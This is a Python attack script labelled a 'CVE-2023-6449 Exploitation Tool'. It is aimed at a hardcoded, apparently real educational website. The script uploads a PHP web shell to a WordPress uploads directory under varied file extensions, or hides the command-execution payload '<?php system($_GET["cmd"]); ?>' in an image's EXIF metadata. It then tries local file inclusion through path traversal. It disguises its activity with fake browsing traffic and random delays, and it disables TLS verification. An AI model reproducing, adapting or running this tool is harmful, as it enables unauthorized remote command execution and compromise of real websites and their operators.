import requests
import random
import string
import time
import os
from cryptography.fernet import Fernet
import urllib3
import subprocess

# Disable SSL warnings for unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ────────────────────────────────────────────────────────────────
#  Project: CVE-2023-6449 Exploitation Tool by Charon
#  This tool uploads either a PHP exploit file or an image file with hidden PHP code
#  Developed by: Charon | All rights reserved.
# ────────────────────────────────────────────────────────────────
print("""
                       (                             
                (      )\ )  *   )                   
                )\    (()/(` )  /(   (     )     )   
             ((((_)(   /(_))( )(_)) ))\ ( /(    (    
              )\ _ )\ (_)) (_(_()) /((_))(_))   )\  '
              (_)_\(_)| _ \|_   _|(_)) ((_)_  _((_)) 
               / _ \  |   /  | |  / -_)/ _` || '  \()
              /_/ \_\ |_|_\  |_|  \___|\__,_||_|_|_| 
 ---------------------------------------------------------------
                     Created by: ARTeam - All Rights to Charon
 ---------------------------------------------------------------
    """)

# Random URLs for traffic simulation
random_urls = [
    "https://example.com/home",
    "https://example.com/about",
    "https://example.com/services",
    "https://example.com/contact",
    "https://example.com/blog"
]

# Function to simulate normal traffic by visiting random URLs
def simulate_normal_traffic(session, url_list):
    random_url = random.choice(url_list)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    }
    try:
        response = session.get(random_url, headers=headers)
        print(f"Visited {random_url} - Status Code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Failed to visit {random_url}: {e}")

# Function to generate a random filename with a specific extension
def random_filename(extension=".php"):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(10)) + extension

# Setup encryption for activity logging
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Function to log encrypted activity data
def log_activity(data):
    encrypted_data = cipher_suite.encrypt(data.encode())
    with open("exploit_log.txt", "ab") as log_file:
        log_file.write(encrypted_data + b"\n")

# Function to add a random delay between requests
def random_delay(min_delay=1, max_delay=5):
    delay = random.uniform(min_delay, max_delay)
    time.sleep(delay)
    print(f"Random delay of {delay:.2f} seconds")

# Retry handler for handling network issues
def retry_request(func, retries=3):
    for attempt in range(retries):
        try:
            return func()
        except requests.exceptions.RequestException as e:
            log_activity(f"Attempt {attempt+1} failed: {e}")
            time.sleep(2)  # Delay before retrying
    print("All attempts failed.")
    return None

# Function to embed PHP code in image metadata
def embed_php_in_image(image_path, php_code):
    try:
        subprocess.run(["exiftool", f"-Comment={php_code}", image_path], check=True)
        print(f"PHP code embedded in {image_path} metadata.")
    except Exception as e:
        print(f"Failed to embed PHP code in image: {e}")

# Function to upload a shell file with varied extensions and check access
def upload_shell(url, session, shell_path):
    extensions = [".php", ".phtml", ".phar", ".txt", ".html"]
    for ext in extensions:
        file_name = random_filename(ext)
        with open(shell_path, 'rb') as file:
            files = {'file': (file_name, file, 'application/octet-stream')}
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
            
            # Simulate traffic before upload
            simulate_normal_traffic(session, random_urls)
            random_delay()
            
            response = retry_request(lambda: session.post(f"{url}/wp-content/uploads", files=files, headers=headers, verify=False))
            
            if response and response.status_code == 200:
                check_url = f"{url}/wp-content/uploads/{file_name}"
                log_activity(f"Shell uploaded successfully as {file_name}: {check_url}")
                print("Shell uploaded successfully as", file_name, ":", check_url)
                
                # Check if file is accessible
                check_response = session.get(check_url, verify=False)
                if check_response.status_code == 200:
                    print(f"File is accessible at: {check_url}")
                    attempt_lfi(url, file_name)  # Try LFI if direct access fails
                    break
                else:
                    print("File was deleted or is inaccessible.")
            else:
                print("Upload failed for", file_name)
            
            # Simulate traffic after upload
            simulate_normal_traffic(session, random_urls)
            random_delay()

# Function to upload an image file with embedded PHP code
def upload_image(url, session, image_path, php_code):
    embed_php_in_image(image_path, php_code)
    
    with open(image_path, 'rb') as image:
        files = {'file': ('image.jpg', image, 'image/jpeg')}
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        
        # Simulate traffic before upload
        simulate_normal_traffic(session, random_urls)
        random_delay()
        
        response = retry_request(lambda: session.post(f"{url}/wp-content/uploads", files=files, headers=headers, verify=False))
        
        if response and response.status_code == 200:
            check_url = f"{url}/wp-content/uploads/image.jpg"
            log_activity(f"Image uploaded successfully: {check_url}")
            print("Image uploaded successfully:", check_url)
        else:
            log_activity("Image upload failed.")
            print("Image upload failed.")
        
        # Simulate traffic after upload
        simulate_normal_traffic(session, random_urls)
        random_delay()

# Function to attempt LFI exploitation
def attempt_lfi(url, file_name):
    lfi_url = f"{url}/index.php?page=../../wp-content/uploads/{file_name}"
    response = retry_request(lambda: requests.get(lfi_url, verify=False))
    
    if response and "Expected Payload Output" in response.text:
        print("LFI exploitation successful!")
        log_activity("LFI exploitation successful")
    else:
        print("LFI exploitation failed.")
        log_activity("LFI exploitation failed")

# ────────────────────────────────────────────────────────────────
#  Execution: Choose option, set target URL, and run upload
# ────────────────────────────────────────────────────────────────

url = "https://oimt.ac.in"
session = requests.Session()

# Prompt user for file type to upload
choice = input("Choose file to upload - (1) Shell (2) Image with PHP in metadata: ")

if choice == "1":
    shell_path = "/sec/root/charon_tool/313.php"
    if os.path.exists(shell_path):
        upload_shell(url, session, shell_path)
    else:
        print("Shell file not found at specified path.")
elif choice == "2":
    image_path = "/sec/root/charon_tool/charon.jpg"
    php_code = '<?php system($_GET["cmd"]); ?>'
    if os.path.exists(image_path):
        upload_image(url, session, image_path, php_code)
    else:
        print("Image file not found at specified path.")
else:
    print("Invalid choice. Please choose 1 or 2.")
